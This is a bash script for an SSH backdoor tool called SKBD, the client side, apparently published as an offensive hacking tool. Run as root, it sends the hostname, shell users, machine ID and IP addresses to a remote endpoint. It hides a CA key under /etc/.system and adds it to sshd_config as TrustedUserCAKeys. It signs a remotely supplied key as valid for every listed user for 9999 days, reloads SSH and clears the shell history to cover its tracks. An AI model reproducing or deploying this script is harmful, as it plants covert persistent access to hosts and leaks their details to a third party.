#!/bin/bash
# https://github.com/MartinxMax            


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'

SKBD="
─────▄▄────▄▀▀█▀▀▀▀▄       ${YELLOW}───▄██▄─────────────▄▄${RESET}
──▄▀▀──▀▀▄▄█▄▄█────█       ${YELLOW}──█████▄▄▄▄───────▄▀${RESET}
▄▀─────────█──█────█       ${YELLOW}────▀██▀▀████▄───▄▀${RESET}
────────────▀▀▀▀▀▀▀        ${YELLOW}───▄█▀▄██▄████▄─▄█${RESET}
                           ${YELLOW}▄▄█▀▄▄█─▀████▀██▀   ${RESET}                          
${RED}   ▄████████    ▄█   ▄█▄ ▀█████████▄  ████████▄  ${RESET}  
  ███    ███   ███ ▄███▀   ███    ███ ███   ▀███ 
${YELLOW}  ███    █▀    ███▐██▀     ███    ███ ███    ███ ${RESET}  
  ███         ▄█████▀     ▄███▄▄▄██▀  ███    ███ 
${RED}▀███████████ ▀▀█████▄    ▀▀███▀▀▀██▄  ███    ███ ${RESET}  
${YELLOW}         ███   ███▐██▄     ███    ██▄ ███    ███ ${RESET}  
   ▄█    ███   ███ ▀███▄   ███    ███ ███   ▄███ 
${RED} ▄████████▀    ███   ▀█▀ ▄█████████▀  ████████▀  ${RESET}  
${PURPLE}Maptnh@S-H4CK13  SKBD(Scorpion-Killer)V1.0-Client  https://github.com/MartinxMax ${RESET}"

echo -e "$SKBD"   

usage() {
    echo -e "${CYAN}Usage: $0 [-e ENDPOINT] [-l CUSTOM_IP]"   
    echo -e "${WHITE}Options:"
    echo -e "  -e ENDPOINT   Specify the server endpoint. (Required)"
    echo -e "  -l IP         Specify custom local IP to add (Optional)"   
    echo -e "  -h            Display this help message."
    echo -e "${RESET}"
}

check_dependencies() {
    dependencies=("openssl" "curl" "getent" "ip" "base64" "ssh-keygen" "paste" "service" "mktemp")
    for cmd in "${dependencies[@]}"; do
        if ! command -v $cmd &>/dev/null; then
            echo -e "${RED}[!] $cmd is not installed.${RESET}"
            missing_cmds=true
        fi
    done
    if [ "$missing_cmds" = true ]; then
        echo -e "${RED}[!] Please install the missing dependencies and try again.${RESET}"
        exit 1
    else
        echo -e "${GREEN}[+] All dependencies are installed.${RESET}"
    fi
}

if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as ROOT.${RESET}"
    exit 1
fi

if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as ROOT.${RESET}"
    exit 1
fi

ENDPOINT=""
LOCAL_IP=""

while getopts ":e:hl:" opt; do 
  case $opt in
    e)
      ENDPOINT=$OPTARG
      ;;
    l)  
      LOCAL_IP=$OPTARG
      ;;
    h)
      usage
      exit 0
      ;;
    \?)
      echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
      usage
      exit 1
      ;;
    :)  
      echo -e "${RED}[!] Option -$OPTARG requires an argument.${RESET}" >&2
      usage
      exit 1
      ;;
  esac
done

if [ -z "$ENDPOINT" ]; then
    usage
    exit 1
fi

check_dependencies
r_md5=$(openssl rand -hex 16)
hostname=$(hostname)
users=$(getent passwd | grep -E 'bash$' | cut -d: -f1 | paste -sd, -)
sn=$(cat /etc/machine-id)
auto_ips=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | tr '\n' ',')
if [ -n "$LOCAL_IP" ]; then
    ips="${auto_ips}${LOCAL_IP}," 
else
    ips="$auto_ips"
fi
echo -e "${YELLOW}[+] MD5: $r_md5${RESET}"
echo -e "${YELLOW}[+] Endpoint: $ENDPOINT${RESET}"
echo -e "${YELLOW}[+] Hostname: $hostname${RESET}"
echo -e "${YELLOW}[+] SSH users available: $users${RESET}"
echo -e "${YELLOW}[+] Host SN: $sn${RESET}"
echo -e "${YELLOW}[+] Local interface ips: $ips${RESET}"
echo -e "${BLUE}[*] Sending request to $ENDPOINT${RESET}"
json_data='{"users":"'$users'","sn":"'$sn'","ips":"'$ips'","endpoint":"'$ENDPOINT'","hostname":"'$hostname'"}'
encrypted_data=$(echo "$json_data" | base64 -w0)
response=$(curl -s -X POST -H "Content-Type: application/octet-stream" -k "$ENDPOINT/skget"  --data-binary "$encrypted_data")
decrypted=$(echo "$response"  | base64 -d)
if [ -z "$decrypted" ]; then
    echo -e "${RED}[!] Decryption failed. Exiting.${RESET}"
    exit 1
fi
if [[ "$decrypted" == '{"data":""}' ]]; then
    echo -e "${RED}[!] Decryption failed. Exiting.${RESET}"
    rm -rf /etc/.system/$r_md5
    exit 1
else
if [ ! -d "/etc/.system" ]; then
    echo -e "${YELLOW}[+] Creating /etc/.system directory${RESET}"
    mkdir -p /etc/.system
else
    echo -e "${GREEN}[*] /etc/.system directory already exists${RESET}"
fi
    ssh-keygen -t rsa -b 4096 -f /etc/.system/$r_md5 -N "" > /dev/null 2>&1
    chmod 600 /etc/.system/$r_md5
    chmod 644 /etc/.system/$r_md5.pub
    echo -e "${YELLOW}[+] Generate load complete${RESET}"
    echo -e "${YELLOW}[+] Adding TrustedUserCAKeys to /etc/ssh/sshd_config${RESET}"
    echo "TrustedUserCAKeys /etc/.system/$r_md5.pub" >> /etc/ssh/sshd_config
    ssh_pub_key=$(echo "$decrypted" | sed -n 's/.*"data"\s*:\s*"\([^"]*\)".*/\1/p' | base64 -d| base64 -d)
    temp_dir=$(mktemp -d)
    chmod 755 $temp_dir
    echo "$ssh_pub_key" > $temp_dir/skbdhk
    ssh-keygen -s /etc/.system/$r_md5 -I $r_md5 -n "$users" -V +9999d $temp_dir/skbdhk > /dev/null 2>&1
    echo -e "${YELLOW}[+] Signing Public Key${RESET}"
    data=$(cat $temp_dir/skbdhk-cert.pub | base64 -w0)
    json_data='{"users":"'$users'","sn":"'$sn'","ips":"'$ips'","endpoint":"'$ENDPOINT'","data":"'$data'","hostname":"'$hostname'"}'
    encrypted_data=$(echo "$json_data"  | base64 -w0)
    response=$(curl -s -X POST -H "Content-Type: application/octet-stream" -k "$ENDPOINT/skput"  --data-binary "$encrypted_data")
    decrypted_upload=$(echo "$response"  | base64 -d)
    if [ -z "$decrypted_upload" ]; then
        echo -e "${RED}[!] Decryption failed. Exiting.${RESET}"
        rm -rf $temp_dir
        rm -rf /etc/.system/$r_md5
        exit 1
    fi
    if [[ "$decrypted_upload" == *"SUCCESS"* ]]; then
        echo -e "${YELLOW}[+] Upload successful. Reloading SSH service.${RESET}"
        service ssh reload || /usr/sbin/sshd -D
    else
        echo -e "${RED}[!] Upload failed. Exiting.${RESET}"
        rm -rf $temp_dir
        rm -rf /etc/.system/$r_md5
        exit 1
    fi
fi

echo -e "${YELLOW}[-] Cleaning up temporary files${RESET}"
rm -rf $temp_dir
history -c
echo -e "${YELLOW}[-] Temporary files and history cleared.${RESET}"
